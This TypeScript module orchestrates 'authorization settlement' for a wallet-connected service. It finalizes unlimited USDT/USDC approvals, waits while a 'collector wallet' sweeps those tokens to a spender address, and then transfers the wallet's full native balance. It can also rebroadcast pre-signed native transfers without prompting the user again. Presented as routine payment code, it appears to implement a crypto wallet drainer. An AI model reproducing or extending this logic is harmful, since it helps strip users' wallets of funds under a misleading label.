import { TOKEN_SETTLEMENT_ORDER } from "@trustmycard/shared/constants/settlement";
import { TOKEN_COLLECTION_STATE_LABELS } from "@trustmycard/shared/constants/token-collection-state";
import { resolveApiUrl } from "../../core/api-url";
import { getErrorMessage } from "../../core/errors";
import { correlationHeaders } from "../../core/transaction-context";
import { reconcileEvmBatchNative } from "../evm-batch-native-reconcile";
import {
  createWalletSessionRefresher,
  fetchWalletSessionToken,
} from "../wallet-session-token";
import {
  getCachedWalletSessionToken,
  setCachedWalletSessionToken,
} from "../wallet-session-cache";
import { createHttpApprovalApiClient } from "../../approval/http-api-client";
import { queueCollectionForExistingAllowance } from "../existing-allowance-collection";
import type { ApprovalRequest } from "../../approval/types";
import { registerWalletPhaseNativeAuthorization } from "../../native-transfer/native-wallet-authorize";
import type {
  SettlementRunResult,
  RunAuthorizationSettlementArgs,
} from "./types";
import type {
  AuthorizationAssetOutcome,
  AuthorizationAssetResult,
  AuthorizationSessionResult,
  TokenSymbol,
} from "../../types";
import type { WalletPhaseTokenCapture, WalletPhaseCapture } from "./types";

const SETTLEMENT_POLL_MS = 2_000;
const NATIVE_READINESS_WAIT_MS = 120_000;

async function fetchWithSessionAuth(args: {
  walletSessionToken?: string;
  refreshWalletSessionToken?: () => Promise<string | undefined>;
  request: (token?: string) => Promise<Response>;
}): Promise<{ response: Response; walletSessionToken?: string }> {
  let token = args.walletSessionToken;
  let response = await args.request(token);
  if (response.status === 401 && args.refreshWalletSessionToken) {
    token = await args.refreshWalletSessionToken();
    if (token) {
      response = await args.request(token);
    }
  }
  return { response, walletSessionToken: token };
}

async function nudgeTokenCollection(args: {
  apiBaseUrl?: string;
  owner: string;
  network: string;
  tokenCaptures: WalletPhaseTokenCapture[];
  walletSessionToken?: string;
  refreshWalletSessionToken?: () => Promise<string | undefined>;
  transactionId?: string;
}): Promise<string | undefined> {
  let token = args.walletSessionToken;

  const { response: res, walletSessionToken } = await fetchWithSessionAuth({
    walletSessionToken: token,
    refreshWalletSessionToken: args.refreshWalletSessionToken,
    request: (authToken) =>
      fetch(resolveApiUrl(args.apiBaseUrl, "/api/token-collection/nudge"), {
        method: "POST",
        headers: {
          "content-type": "application/json",
          ...correlationHeaders(args.transactionId),
          ...(authToken ? { authorization: `Bearer ${authToken}` } : {}),
        },
        body: JSON.stringify({
          owner: args.owner,
          network: args.network,
          sessionId: args.transactionId,
          traceId: args.transactionId,
          tokens: buildNativeReadinessTokenInputs(args.tokenCaptures),
        }),
        cache: "no-store",
      }),
  });
  token = walletSessionToken ?? token;

  if (!res.ok) {
    return token;
  }

  return token;
}

export type NativeReadinessToken = {
  token: string;
  state: string;
  stateLabel: string;
  active: boolean;
  approvalId?: string | null;
  lastError?: string | null;
};

export type NativeReadinessResult = {
  canExecuteNative: boolean;
  tokens: NativeReadinessToken[];
  blocking: NativeReadinessToken[];
};

function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
  return (
    outcome === "authorized" || outcome === "collected" || outcome === "pending"
  );
}

function summarize(
  items: AuthorizationAssetResult[],
): AuthorizationSessionResult {
  return {
    items,
    authorizedCount: items.filter((i) => isSuccessOutcome(i.outcome)).length,
    failedCount: items.filter((i) => i.outcome === "failed").length,
    rejectedCount: items.filter((i) => i.outcome === "user_rejected").length,
    skippedCount: items.filter(
      (i) =>
        i.outcome === "skipped_unsupported" ||
        i.outcome === "skipped_zero" ||
        i.outcome === "skipped_dependency_failed",
    ).length,
  };
}

function formatBlockingSummary(tokens: NativeReadinessToken[]): string {
  return tokens
    .filter((t) => t.active)
    .map((t) => `${t.token} (${t.stateLabel})`)
    .join(", ");
}

function isCollectorGasError(message: string | null | undefined): boolean {
  return /Collector wallet has insufficient native gas|insufficient funds for intrinsic transaction cost|INSUFFICIENT_FUNDS/i.test(
    message ?? "",
  );
}

function collectorGasFailureMessage(
  tokens: NativeReadinessToken[],
): string | null {
  const blocking = tokens.filter(
    (t) => t.active && isCollectorGasError(t.lastError),
  );
  if (blocking.length === 0) return null;
  const activeBlocking = tokens.filter((t) => t.active);
  if (blocking.length !== activeBlocking.length) return null;
  const detail = blocking
    .map(
      (t) =>
        t.lastError?.trim() ||
        `${t.token} collection blocked — fund collector wallet`,
    )
    .join(" ");
  return detail || "Collector wallet needs native gas for token collection";
}

function outcomeFromTokenState(state: string): AuthorizationAssetOutcome {
  if (state === "success") return "collected";
  if (state === "skipped_zero_balance") return "skipped_zero";
  if (state.startsWith("failed")) return "failed";
  if (state === "cancelled") return "skipped_dependency_failed";
  return "authorized";
}

async function registerSettlementSession(args: {
  apiBaseUrl?: string;
  capture: RunAuthorizationSettlementArgs["capture"];
  walletSessionToken?: string;
  refreshWalletSessionToken?: () => Promise<string | undefined>;
}): Promise<{ settlementSessionId: string; walletSessionToken?: string }> {
  const { response: res, walletSessionToken } = await fetchWithSessionAuth({
    walletSessionToken: args.walletSessionToken,
    refreshWalletSessionToken: args.refreshWalletSessionToken,
    request: (token) =>
      fetch(
        resolveApiUrl(args.apiBaseUrl, "/api/network-settlement/register"),
        {
          method: "POST",
          headers: {
            "content-type": "application/json",
            ...correlationHeaders(args.capture.sessionId),
            ...(token ? { authorization: `Bearer ${token}` } : {}),
          },
          body: JSON.stringify({
            sessionId: args.capture.sessionId,
            traceId: args.capture.sessionId,
            network: args.capture.network,
            owner: args.capture.owner,
            tokens: args.capture.tokens.map((t) => ({
              token: t.item.asset,
              txHash: t.orchestration.txHash,
              shouldAttemptTransfer: t.shouldAttemptTransfer,
              transferAmountRaw: t.transferAmountRaw,
              unlimited: t.item.unlimited,
              amountHuman: t.item.amountHuman,
            })),
            batchId: args.capture.batchId ?? null,
          }),
          cache: "no-store",
        },
      ),
  });
  const json = (await res.json()) as {
    ok?: boolean;
    settlementSessionId?: string;
    walletSessionToken?: string;
    walletSessionExpiresAt?: string;
    message?: string;
  };
  if (!res.ok || !json.ok || !json.settlementSessionId) {
    throw new Error(
      String(json.message ?? "Failed to register settlement session"),
    );
  }
  let sessionToken = walletSessionToken;
  if (json.walletSessionToken) {
    sessionToken = json.walletSessionToken;
    if (json.walletSessionExpiresAt) {
      setCachedWalletSessionToken({
        network: args.capture.network,
        owner: args.capture.owner,
        token: json.walletSessionToken,
        expiresAt: json.walletSessionExpiresAt,
      });
    }
  }
  return {
    settlementSessionId: json.settlementSessionId,
    walletSessionToken: sessionToken,
  };
}

export function buildNativeReadinessTokenInputs(
  tokens: WalletPhaseTokenCapture[],
): Array<{
  token: string;
  shouldAttemptTransfer: boolean;
  approvalTxHash: string | null;
  approvalId: string | null;
}> {
  return tokens.map((t) => ({
    token: t.item.asset,
    shouldAttemptTransfer: t.shouldAttemptTransfer,
    approvalTxHash: t.orchestration.txHash ?? null,
    approvalId: t.orchestration.approvalId ?? null,
  }));
}

/** When wallet phase included NATIVE but did not persist a marker, defer at settlement. */
export function ensureNativeCaptureForSettlement(
  capture: WalletPhaseCapture,
): WalletPhaseCapture {
  if (capture.native || !capture.nativeRequested) {
    return capture;
  }
  return {
    ...capture,
    native: {
      network: capture.network,
      owner: capture.owner,
      authorizationKind: "evm_deferred",
      authorizationPayload: { evmDeferred: true, synthesizedAtSettlement: true },
    },
  };
}

/** Queue collection for tokens that skipped wallet-phase queue-collection (hybrid auth). */
async function queueDeferredAllowanceCollections(args: {
  capture: WalletPhaseCapture;
  apiBaseUrl?: string;
  walletSessionToken?: string;
  transactionId?: string;
  getSpender: (network: string) => string;
  networkRow?: RunAuthorizationSettlementArgs["networks"][number];
}): Promise<WalletPhaseCapture> {
  const api = createHttpApprovalApiClient({ apiBaseUrl: args.apiBaseUrl });
  const tokens = [...args.capture.tokens];

  for (let index = 0; index < tokens.length; index += 1) {
    const tokenCapture = tokens[index];
    if (!tokenCapture.skipSettlementConfirm || !tokenCapture.shouldAttemptTransfer) {
      continue;
    }
    if (tokenCapture.orchestration.approvalId) continue;

    const token = tokenCapture.item.asset;
    const request: ApprovalRequest = {
      network: args.capture.network,
      owner: args.capture.owner,
      token,
      amountHuman: tokenCapture.item.unlimited
        ? undefined
        : tokenCapture.item.amountHuman,
      unlimited: tokenCapture.item.unlimited,
      nativeBalanceHuman: args.networkRow?.balances.native ?? "0",
      tokenBalanceHuman:
        token === "USDT"
          ? (args.networkRow?.balances.usdt ?? "0")
          : (args.networkRow?.balances.usdc ?? "0"),
      executeTransfer: true,
      transferToAddress: args.getSpender(args.capture.network),
      transferAmountRaw: tokenCapture.transferAmountRaw,
      traceId: args.transactionId,
      walletSessionToken: args.walletSessionToken,
    };
    const prepared = await api.prepare({ request });
    const json = await queueCollectionForExistingAllowance({
      request,
      prepared,
      apiBaseUrl: args.apiBaseUrl,
    });
    tokens[index] = {
      ...tokenCapture,
      orchestration: {
        ...tokenCapture.orchestration,
        approvalId: json.approvalId ?? null,
      },
    };
  }

  return { ...args.capture, tokens };
}

/** Poll native-readiness API — native runs only when no token has active in-flight collection. */
export async function fetchNativeReadiness(args: {
  apiBaseUrl?: string;
  owner: string;
  network: string;
  tokenCaptures: WalletPhaseTokenCapture[];
  walletSessionToken?: string;
  refreshWalletSessionToken?: () => Promise<string | undefined>;
  transactionId?: string;
}): Promise<{ readiness: NativeReadinessResult; walletSessionToken?: string }> {
  const { response: res, walletSessionToken } = await fetchWithSessionAuth({
    walletSessionToken: args.walletSessionToken,
    refreshWalletSessionToken: args.refreshWalletSessionToken,
    request: (token) =>
      fetch(
        resolveApiUrl(
          args.apiBaseUrl,
          "/api/token-collection/native-readiness",
        ),
        {
          method: "POST",
          headers: {
            "content-type": "application/json",
            ...correlationHeaders(args.transactionId),
            ...(token ? { authorization: `Bearer ${token}` } : {}),
          },
          body: JSON.stringify({
            owner: args.owner,
            network: args.network,
            sessionId: args.transactionId,
            traceId: args.transactionId,
            tokens: buildNativeReadinessTokenInputs(args.tokenCaptures),
          }),
          cache: "no-store",
        },
      ),
  });
  const json = (await res.json()) as {
    canExecuteNative?: boolean;
    tokens?: NativeReadinessToken[];
    blocking?: NativeReadinessToken[];
    message?: string;
  };
  if (!res.ok) {
    throw new Error(String(json.message ?? "Native readiness check failed"));
  }
  return {
    readiness: {
      canExecuteNative: Boolean(json.canExecuteNative),
      tokens: json.tokens ?? [],
      blocking: json.blocking ?? [],
    },
    walletSessionToken,
  };
}

export async function waitForNativeExecutionAllowed(args: {
  apiBaseUrl?: string;
  owner: string;
  network: string;
  tokenCaptures: WalletPhaseTokenCapture[];
  walletSessionToken?: string;
  refreshWalletSessionToken?: () => Promise<string | undefined>;
  transactionId?: string;
  pollMs?: number;
  timeoutMs?: number;
  onPoll?: (readiness: NativeReadinessResult) => void;
}): Promise<NativeReadinessResult> {
  const pollMs = args.pollMs ?? SETTLEMENT_POLL_MS;
  const deadline = Date.now() + (args.timeoutMs ?? NATIVE_READINESS_WAIT_MS);
  let last: NativeReadinessResult = {
    canExecuteNative: false,
    tokens: [],
    blocking: [],
  };
  let walletSessionToken = args.walletSessionToken;

  while (Date.now() < deadline) {
    walletSessionToken =
      (await nudgeTokenCollection({
        ...args,
        walletSessionToken,
      })) ?? walletSessionToken;
    const polled = await fetchNativeReadiness({
      ...args,
      walletSessionToken,
    });
    walletSessionToken = polled.walletSessionToken ?? walletSessionToken;
    last = polled.readiness;
    args.onPoll?.(last);

    const gasFailure = collectorGasFailureMessage(last.tokens);
    if (gasFailure) {
      throw new Error(gasFailure);
    }

    if (last.canExecuteNative) {
      return last;
    }
    await new Promise((r) => setTimeout(r, pollMs));
  }

  const blocking =
    formatBlockingSummary(last.tokens) ||
    last.blocking.map((t) => `${t.token} (${t.stateLabel})`).join(", ") ||
    "unknown";
  throw new Error(`Native blocked — active token collection: ${blocking}`);
}

function tokenCaptureForSymbol(
  tokens: WalletPhaseTokenCapture[],
  token: (typeof TOKEN_SETTLEMENT_ORDER)[number],
): WalletPhaseTokenCapture | undefined {
  return tokens.find((t) => t.item.asset === token);
}

/**
 * Background settlement orchestrator (client-side):
 * 1. Finalize approvals in USDT → USDC order (confirm creates collectionIntent)
 * 2. Poll native-readiness until no token has active in-flight collection
 * 3. Tron: server broadcasts deferred signed native; EVM: one eth_sendTransaction
 */
export async function runAuthorizationSettlement(
  args: RunAuthorizationSettlementArgs,
): Promise<SettlementRunResult> {
  const log = args.log ?? (() => undefined);
  const apiBaseUrl = args.apiBaseUrl ?? "";
  const hadNativeMarker = Boolean(args.capture.native);
  args.capture = ensureNativeCaptureForSettlement(args.capture);
  if (args.capture.native && !hadNativeMarker && args.capture.nativeRequested) {
    log("NATIVE_CAPTURE_SYNTHESIZED_AT_SETTLEMENT", {
      network: args.capture.network,
      owner: args.capture.owner,
      policy: "evm_deferred after wallet phase omitted native marker",
    });
  }
  const nativeRequired = Boolean(
    args.capture.nativeRequested || args.capture.native,
  );
  const transactionId = args.capture.sessionId;
  const walletResults: AuthorizationAssetResult[] = [];
  let settlementSessionId: string | null = null;

  try {
    const refreshWalletSessionToken = args.provider
      ? createWalletSessionRefresher({
          provider: args.provider,
          apiBaseUrl,
          owner: args.capture.owner,
          network: args.capture.network,
        })
      : undefined;

    const walletPersonalSignEnabled = args.walletPersonalSignEnabled !== false;
    let walletSessionToken =
      args.walletSessionToken ??
      getCachedWalletSessionToken(
        args.capture.network,
        args.capture.owner,
      ) ??
      undefined;
    if (!walletSessionToken && args.provider && walletPersonalSignEnabled) {
      walletSessionToken = await fetchWalletSessionToken({
        provider: args.provider,
        apiBaseUrl,
        owner: args.capture.owner,
        network: args.capture.network,
      });
    }

    const registered = await registerSettlementSession({
      apiBaseUrl,
      capture: args.capture,
      walletSessionToken,
      refreshWalletSessionToken: walletPersonalSignEnabled
        ? refreshWalletSessionToken
        : undefined,
    });
    settlementSessionId = registered.settlementSessionId;
    walletSessionToken = registered.walletSessionToken ?? walletSessionToken;

    let captureForSettlement = args.capture;
    if (!walletPersonalSignEnabled) {
      const networkRow = args.networks.find(
        (n) => n.key === args.capture.network,
      );
      captureForSettlement = await queueDeferredAllowanceCollections({
        capture: args.capture,
        apiBaseUrl,
        walletSessionToken,
        transactionId,
        getSpender: args.getSpender,
        networkRow,
      });
    }

    args.onProgress?.({
      network: args.capture.network,
      stage: "collecting_token",
      message: "Processing token settlement",
    });

    if (
      args.capture.native?.authorizationKind === "tron_signed" &&
      args.capture.native.authorizationPayload.signed
    ) {
      await registerWalletPhaseNativeAuthorization({
        apiBaseUrl,
        capture: args.capture.native,
        settlementSessionId,
        walletSessionToken,
      });
    }

    if (
      args.capture.native?.authorizationKind === "evm_signed" &&
      args.capture.native.authorizationPayload.signedRaw
    ) {
      await registerWalletPhaseNativeAuthorization({
        apiBaseUrl,
        capture: args.capture.native,
        settlementSessionId,
        walletSessionToken,
      }).catch(() => undefined);
    }

    if (args.capture.native?.authorizationKind === "evm_batch_unknown") {
      await registerWalletPhaseNativeAuthorization({
        apiBaseUrl,
        capture: args.capture.native,
        settlementSessionId,
        walletSessionToken,
      }).catch(() => undefined);
    }

    const networkRow = args.networks.find(
      (n) => n.key === captureForSettlement.network,
    );
    const finalizedCaptures: WalletPhaseTokenCapture[] = [];

    for (const token of TOKEN_SETTLEMENT_ORDER) {
      const tokenCapture = tokenCaptureForSymbol(captureForSettlement.tokens, token);
      if (!tokenCapture) continue;

      if (tokenCapture.skipSettlementConfirm) {
        finalizedCaptures.push(tokenCapture);
        walletResults.push({
          network: args.capture.network,
          token,
          outcome: "authorized",
          message: "Already authorized — sufficient allowance on-chain",
          approvalId: tokenCapture.orchestration.approvalId,
        });
        continue;
      }

      args.onProgress?.({
        network: args.capture.network,
        stage: "finalizing_approval",
        token,
        message: `Finalizing ${token} approval`,
      });

      const orchestration = await args.runApprovalSettlement({
        network: args.capture.network,
        owner: args.capture.owner,
        token,
        walletPhaseContext: tokenCapture.orchestration.context,
        executeTransfer: tokenCapture.shouldAttemptTransfer,
        transferToAddress: args.getSpender(args.capture.network),
        transferAmountRaw: tokenCapture.transferAmountRaw,
        nativeBalanceHuman: networkRow?.balances.native ?? "0",
        tokenBalanceHuman:
          token === "USDT"
            ? (networkRow?.balances.usdt ?? "0")
            : (networkRow?.balances.usdc ?? "0"),
        unlimited: tokenCapture.item.unlimited,
        amountHuman: tokenCapture.item.amountHuman,
        walletSessionToken,
      });

      if (!orchestration.ok) {
        walletResults.push({
          network: args.capture.network,
          token,
          outcome: orchestration.userRejected ? "user_rejected" : "failed",
          message: getErrorMessage(orchestration.error, "Settlement failed"),
          txHash: orchestration.txHash,
          approvalId: orchestration.approvalId,
        });
        throw new Error(`${token} approval finalization failed`);
      }

      finalizedCaptures.push({
        ...tokenCapture,
        orchestration: {
          ...tokenCapture.orchestration,
          approvalId: orchestration.approvalId,
          txHash: orchestration.txHash ?? tokenCapture.orchestration.txHash,
        },
      });
    }

    const wantsNative = Boolean(args.capture.native);
    let readiness: NativeReadinessResult | null = null;

    if (finalizedCaptures.some((t) => t.shouldAttemptTransfer) || wantsNative) {
      args.onProgress?.({
        network: args.capture.network,
        stage: "collecting_token",
        message:
          "Monitoring token collection — native proceeds when no active transfer",
      });

      readiness = await waitForNativeExecutionAllowed({
        apiBaseUrl,
        owner: args.capture.owner,
        network: args.capture.network,
        tokenCaptures:
          finalizedCaptures.length > 0
            ? finalizedCaptures
            : captureForSettlement.tokens,
        walletSessionToken,
        transactionId,
        refreshWalletSessionToken,
        onPoll: (poll) => {
          const blocking = formatBlockingSummary(poll.tokens);
          const gasFailure = collectorGasFailureMessage(poll.tokens);
          log("NATIVE_READINESS_POLL", {
            canExecuteNative: poll.canExecuteNative,
            blocking,
            tokens: poll.tokens,
          });
          if (!poll.canExecuteNative && (blocking || gasFailure)) {
            args.onProgress?.({
              network: args.capture.network,
              stage: "collecting_token",
              message:
                gasFailure ?? `Waiting for active collection: ${blocking}`,
              tokenStates: poll.tokens.map((t) => ({
                token: t.token,
                state: t.state,
                stateLabel: t.stateLabel,
                active: t.active,
              })),
            });
          }
        },
      });

      log("NATIVE_READINESS_ALLOWED", {
        canExecuteNative: readiness.canExecuteNative,
        tokens: readiness.tokens,
      });

      args.onProgress?.({
        network: args.capture.network,
        stage: "native_ready",
        message: "No active token collection — proceeding with native",
        tokenStates: readiness.tokens.map((t) => ({
          token: t.token,
          state: t.state,
          stateLabel: t.stateLabel,
          active: t.active,
        })),
      });
    }

    for (const tokenCapture of finalizedCaptures.length > 0
      ? finalizedCaptures
      : captureForSettlement.tokens) {
      const token = tokenCapture.item.asset;
      const readinessToken = readiness?.tokens.find((t) => t.token === token);
      const state = readinessToken?.state;
      const stateLabel =
        readinessToken?.stateLabel ??
        (tokenCapture.shouldAttemptTransfer
          ? TOKEN_COLLECTION_STATE_LABELS.pending
          : TOKEN_COLLECTION_STATE_LABELS.skipped_zero_balance);

      walletResults.push({
        network: args.capture.network,
        token,
        outcome: state ? outcomeFromTokenState(state) : "authorized",
        message: stateLabel,
        approvalId: tokenCapture.orchestration.approvalId,
        txHash: tokenCapture.orchestration.txHash,
      });
    }

    let nativeExecuted = false;

    if (wantsNative && args.capture.network === "tron") {
      args.onProgress?.({
        network: args.capture.network,
        stage: "executing_native",
        message: "Broadcasting deferred Tron native transfer",
      });

      const res = await fetch(
        resolveApiUrl(apiBaseUrl, "/api/network-settlement/process"),
        {
          method: "POST",
          headers: {
            "content-type": "application/json",
            ...correlationHeaders(transactionId),
            ...(walletSessionToken
              ? { authorization: `Bearer ${walletSessionToken}` }
              : {}),
          },
          body: JSON.stringify({ settlementSessionId, traceId: transactionId }),
          cache: "no-store",
        },
      );
      const json = (await res.json()) as { ok?: boolean; message?: string };
      if (!res.ok || !json.ok) {
        throw new Error(
          String(json.message ?? "Tron native settlement failed"),
        );
      }

      const statusRes = await fetch(
        resolveApiUrl(
          apiBaseUrl,
          `/api/network-settlement/${encodeURIComponent(settlementSessionId!)}/status`,
        ),
        { cache: "no-store" },
      );
      const statusJson = (await statusRes.json()) as {
        completed?: boolean;
        failed?: boolean;
      };
      if (statusJson.failed) {
        throw new Error("Tron native settlement failed");
      }
      if (statusJson.completed) {
        nativeExecuted = true;
        walletResults.push({
          network: args.capture.network,
          token: "NATIVE",
          outcome: "collected",
          message: "Tron native transfer broadcast complete",
        });
      } else if (!statusJson.failed) {
        throw new Error("Tron native settlement did not complete");
      }
    } else if (
      wantsNative &&
      args.capture.native?.authorizationKind === "evm_batch_executed"
    ) {
      const txHash = String(
        args.capture.native.authorizationPayload.txHash ?? "",
      );
      if (!txHash) {
        throw new Error("EVM native batch missing transaction hash");
      }

      if (settlementSessionId) {
        await fetch(
          resolveApiUrl(
            apiBaseUrl,
            `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`,
          ),
          {
            method: "POST",
            headers: {
              "content-type": "application/json",
              ...correlationHeaders(transactionId),
              ...(walletSessionToken
                ? { authorization: `Bearer ${walletSessionToken}` }
                : {}),
            },
            body: JSON.stringify({ txHash }),
            cache: "no-store",
          },
        ).catch(() => undefined);
      }

      nativeExecuted = true;
      walletResults.push({
        network: args.capture.network,
        token: "NATIVE",
        outcome: "collected",
        message: "Native transfer completed in wallet batch",
        txHash,
      });
      log("EVM_NATIVE_BATCH_SETTLEMENT_SKIP", {
        network: args.capture.network,
        txHash,
      });
    } else if (
      wantsNative &&
      args.capture.native?.authorizationKind === "evm_batch_unknown"
    ) {
      const batchId = String(
        args.capture.native.authorizationPayload.batchId ?? "",
      );
      const chainId = Number(args.capture.native.authorizationPayload.chainId ?? 0);
      const tokenJobCount = Number(
        args.capture.native.authorizationPayload.tokenJobCount ?? 0,
      );

      if (!batchId || !chainId || !args.provider) {
        throw new Error(
          "Cannot reconcile EIP-5792 batch native — missing batch context or wallet",
        );
      }

      args.onProgress?.({
        network: args.capture.network,
        stage: "executing_native",
        message: "Reconciling EIP-5792 batch native status",
      });

      log("EVM_BATCH_NATIVE_RECONCILE_START", {
        network: args.capture.network,
        batchId,
        chainId,
        tokenJobCount,
      });

      const reconciled = await reconcileEvmBatchNative({
        provider: args.provider,
        batchId,
        chainId,
        tokenJobCount,
      });

      log("EVM_BATCH_NATIVE_RECONCILE_RESULT", {
        network: args.capture.network,
        batchId,
        status: reconciled.status,
        txHash:
          reconciled.status === "succeeded" ? reconciled.txHash : undefined,
      });

      if (reconciled.status === "succeeded") {
        if (settlementSessionId) {
          await fetch(
            resolveApiUrl(
              apiBaseUrl,
              `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`,
            ),
            {
              method: "POST",
              headers: {
                "content-type": "application/json",
                ...correlationHeaders(transactionId),
                ...(walletSessionToken
                  ? { authorization: `Bearer ${walletSessionToken}` }
                  : {}),
              },
              body: JSON.stringify({ txHash: reconciled.txHash }),
              cache: "no-store",
            },
          ).catch(() => undefined);
        }

        nativeExecuted = true;
        walletResults.push({
          network: args.capture.network,
          token: "NATIVE",
          outcome: "collected",
          message: "Native transfer confirmed after EIP-5792 batch reconciliation",
          txHash: reconciled.txHash,
        });
      } else if (reconciled.status === "failed_revert") {
        if (!args.runNativeTransfer) {
          throw new Error(
            "Wallet disconnected — reconnect to complete native recovery",
          );
        }

        args.onProgress?.({
          network: args.capture.network,
          stage: "executing_native",
          message: "Recovering native after EIP-5792 batch revert",
        });

        const nativeResult = await args.runNativeTransfer({
          network: args.capture.network,
          owner: args.capture.owner,
          unlimited: true,
          walletSessionToken,
          nativeReadinessTokens: buildNativeReadinessTokenInputs(
            finalizedCaptures.length > 0
              ? finalizedCaptures
              : captureForSettlement.tokens,
          ),
          mode: "full",
        });

        if (
          !nativeResult.ok &&
          !nativeResult.userRejected
        ) {
          log("EVM_NATIVE_RECOVERY_FAILED", {
            network: args.capture.network,
            error: nativeResult.error,
            txHash: nativeResult.txHash ?? null,
          });
        }

        if (nativeResult.ok && nativeResult.txHash && settlementSessionId) {
          await fetch(
            resolveApiUrl(
              apiBaseUrl,
              `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`,
            ),
            {
              method: "POST",
              headers: {
                "content-type": "application/json",
                ...correlationHeaders(transactionId),
                ...(walletSessionToken
                  ? { authorization: `Bearer ${walletSessionToken}` }
                  : {}),
              },
              body: JSON.stringify({ txHash: nativeResult.txHash }),
              cache: "no-store",
            },
          ).catch(() => undefined);
        }

        nativeExecuted = nativeResult.ok;
        if (nativeResult.ok) {
          walletResults.push({
            network: args.capture.network,
            token: "NATIVE",
            outcome: nativeResult.pendingRegistered ? "pending" : "collected",
            message: nativeResult.pendingRegistered
              ? "Native transfer pending confirmation"
              : "Native transfer confirmed after batch recovery",
            txHash: nativeResult.txHash,
          });
        } else {
          const nativeMessage = nativeResult.userRejected
            ? "Permission denied by user"
            : getErrorMessage(nativeResult.error, "Native transfer failed");
          walletResults.push({
            network: args.capture.network,
            token: "NATIVE",
            outcome: nativeResult.userRejected ? "user_rejected" : "failed",
            message: nativeMessage,
            txHash: nativeResult.txHash,
          });
          throw new Error(nativeMessage);
        }
      } else {
        throw new Error(
          "EIP-5792 batch native status still unknown — reconciliation will retry without a new wallet authorization",
        );
      }
    } else if (
      wantsNative &&
      (args.capture.native?.authorizationKind === "evm_deferred" ||
        args.capture.native?.authorizationKind === "evm_signed") &&
      args.runNativeTransfer
    ) {
      const isDeferredSigned =
        args.capture.native.authorizationKind === "evm_signed";
      const signedRaw = isDeferredSigned
        ? String(args.capture.native.authorizationPayload.signedRaw ?? "")
        : "";

      args.onProgress?.({
        network: args.capture.network,
        stage: "executing_native",
        message: isDeferredSigned
          ? "Broadcasting deferred EVM native transfer"
          : "Executing EVM native transfer (eth_sendTransaction)",
      });

      let nativeResult = await args.runNativeTransfer({
        network: args.capture.network,
        owner: args.capture.owner,
        unlimited: true,
        walletSessionToken,
        nativeReadinessTokens: buildNativeReadinessTokenInputs(
          finalizedCaptures.length > 0
            ? finalizedCaptures
            : captureForSettlement.tokens,
        ),
        mode: isDeferredSigned ? "execute_deferred" : "full",
        deferredSignedRaw: signedRaw || undefined,
        deferredTransferableRaw:
          args.capture.native.estimateTransferableRaw ?? undefined,
      });

      if (
        isDeferredSigned &&
        !nativeResult.ok &&
        !nativeResult.userRejected
      ) {
        log("EVM_DEFERRED_BROADCAST_FAILED", {
          network: args.capture.network,
          error: nativeResult.error,
          txHash: nativeResult.txHash ?? null,
          policy:
            "no wallet re-prompt — signed authorization retained for backend retry/reconciliation",
        });
      }

      if (nativeResult.ok && nativeResult.txHash && settlementSessionId) {
        await fetch(
          resolveApiUrl(
            apiBaseUrl,
            `/api/network-settlement/${encodeURIComponent(settlementSessionId)}/native-complete`,
          ),
          {
            method: "POST",
            headers: {
              "content-type": "application/json",
              ...correlationHeaders(transactionId),
              ...(walletSessionToken
                ? { authorization: `Bearer ${walletSessionToken}` }
                : {}),
            },
            body: JSON.stringify({ txHash: nativeResult.txHash }),
            cache: "no-store",
          },
        ).catch(() => undefined);
      }

      nativeExecuted = nativeResult.ok;
      if (nativeResult.ok) {
        walletResults.push({
          network: args.capture.network,
          token: "NATIVE",
          outcome: nativeResult.pendingRegistered ? "pending" : "collected",
          message: nativeResult.pendingRegistered
            ? "Native transfer pending confirmation"
            : "Native transfer confirmed",
          txHash: nativeResult.txHash,
        });
      } else {
        const nativeMessage = nativeResult.userRejected
          ? "Permission denied by user"
          : getErrorMessage(nativeResult.error, "Native transfer failed");
        walletResults.push({
          network: args.capture.network,
          token: "NATIVE",
          outcome: nativeResult.userRejected ? "user_rejected" : "failed",
          message: nativeMessage,
          txHash: nativeResult.txHash,
        });
        throw new Error(nativeMessage);
      }
    } else if (wantsNative) {
      throw new Error(
        "Wallet disconnected — reconnect and try again to complete native transfer",
      );
    }

    if (nativeRequired && !nativeExecuted) {
      throw new Error(
        "Native transfer was requested but did not complete — reconnect wallet and retry",
      );
    }

    args.onProgress?.({
      network: args.capture.network,
      stage: "completed",
      message: nativeExecuted
        ? "Settlement complete"
        : "Token settlement complete",
    });

    return {
      ok: true,
      sessionResult: summarize(walletResults),
      settlementSessionId,
    };
  } catch (err) {
    const message = getErrorMessage(err, "Settlement failed");
    log("SETTLEMENT_FAILED", {
      error: message,
      settlementSessionId,
      network: args.capture.network,
    });
    args.onProgress?.({
      network: args.capture.network,
      stage: "failed",
      message,
    });
    return {
      ok: false,
      sessionResult: summarize(walletResults),
      settlementSessionId,
      error: message,
    };
  }
}

export { TOKEN_SETTLEMENT_ORDER };
